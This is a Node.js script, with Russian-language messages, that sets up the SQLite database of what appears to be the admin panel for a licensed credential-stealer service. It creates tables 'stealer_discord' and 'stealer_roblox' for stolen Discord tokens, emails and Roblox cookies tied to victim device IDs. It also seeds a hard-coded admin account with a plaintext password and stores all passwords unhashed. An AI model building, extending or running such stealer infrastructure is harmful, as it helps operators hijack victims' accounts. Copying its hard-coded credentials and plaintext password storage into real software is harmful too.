#!/usr/bin/env node

/**
 * Add Admin User Script
 * Usage: node add-admin.js <username> <password>
 */

const Database = require("better-sqlite3")
const path = require("path")
const { v4: uuidv4 } = require("uuid")

const dbPath = path.join(__dirname, "grob.db")

const args = process.argv.slice(2)

if (args.length < 2) {
  console.error("Usage: node add-admin.js <username> <password>")
  console.error("Example: node add-admin.js test kmrat")
  process.exit(1)
}

const username = args[0]
const password = args[1]

if (username.length < 3) {
  console.error("❌ Имя пользователя должно быть не менее 3 символов")
  process.exit(1)
}

if (password.length < 4) {
  console.error("❌ Пароль должен быть не менее 4 символов")
  process.exit(1)
}

try {
  const db = new Database(dbPath)
  db.pragma("foreign_keys = ON")

  // Create tables
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id TEXT PRIMARY KEY,
      username TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      is_admin INTEGER DEFAULT 0,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      license_key TEXT,
      license_expiry TEXT,
      uid TEXT UNIQUE NOT NULL,
      blocked INTEGER DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS license_keys (
      id TEXT PRIMARY KEY,
      key TEXT UNIQUE NOT NULL,
      created_by TEXT NOT NULL,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      duration TEXT NOT NULL,
      max_activations INTEGER NOT NULL,
      activations INTEGER DEFAULT 0,
      is_active INTEGER DEFAULT 1,
      FOREIGN KEY (created_by) REFERENCES users(id)
    );

    CREATE TABLE IF NOT EXISTS license_activations (
      id TEXT PRIMARY KEY,
      license_id TEXT NOT NULL,
      user_id TEXT NOT NULL,
      activated_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (license_id) REFERENCES license_keys(id),
      FOREIGN KEY (user_id) REFERENCES users(id),
      UNIQUE(license_id, user_id)
    );

    CREATE TABLE IF NOT EXISTS device_owners (
      device_id TEXT PRIMARY KEY,
      user_uid TEXT NOT NULL,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_uid) REFERENCES users(uid)
    );

    CREATE TABLE IF NOT EXISTS stealer_discord (
      id TEXT PRIMARY KEY,
      user_uid TEXT NOT NULL,
      device_id TEXT NOT NULL,
      token TEXT NOT NULL,
      username TEXT,
      display_name TEXT,
      email TEXT,
      user_id TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_uid) REFERENCES users(uid)
    );

    CREATE TABLE IF NOT EXISTS stealer_roblox (
      id TEXT PRIMARY KEY,
      user_uid TEXT NOT NULL,
      device_id TEXT NOT NULL,
      cookie TEXT NOT NULL,
      username TEXT,
      roblox_id TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_uid) REFERENCES users(uid)
    );

    CREATE TABLE IF NOT EXISTS news (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      content TEXT NOT NULL,
      created_by TEXT NOT NULL,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (created_by) REFERENCES users(id)
    );
  `)

  // Check if user already exists
  const existingUser = db.prepare("SELECT id FROM users WHERE username = ?").get(username)

  if (existingUser) {
    console.error(`❌ Пользователь "${username}" уже существует`)
    process.exit(1)
  }

  // Insert default admin if not exists
  const adminExists = db.prepare("SELECT id FROM users WHERE username = ?").get("ORIXMAN")
  if (!adminExists) {
    db.prepare(`
      INSERT INTO users (id, username, password, is_admin, uid, license_key, license_expiry)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run("admin-001", "ORIXMAN", "180886", 1, "admin-uid-001", "ADMIN-PERMANENT", "forever")
  }

  // Create new admin user
  const userId = uuidv4()
  const userUid = uuidv4()

  db.prepare(`
    INSERT INTO users (id, username, password, is_admin, uid, license_key, license_expiry)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `).run(userId, username, password, 1, userUid, "ADMIN-MANUAL", "forever")

  const newUser = db.prepare("SELECT * FROM users WHERE id = ?").get(userId)

  console.log("\n✅ Администратор успешно создан!\n")
  console.log("Данные входа:")
  console.log(`  Логин:      ${newUser.username}`)
  console.log(`  Пароль:     ${password}`)
  console.log(`  ID:         ${newUser.id}`)
  console.log(`  UID:        ${newUser.uid}`)
  console.log("\n")

  db.close()
} catch (error) {
  console.error("❌ Ошибка:", error.message)
  process.exit(1)
}
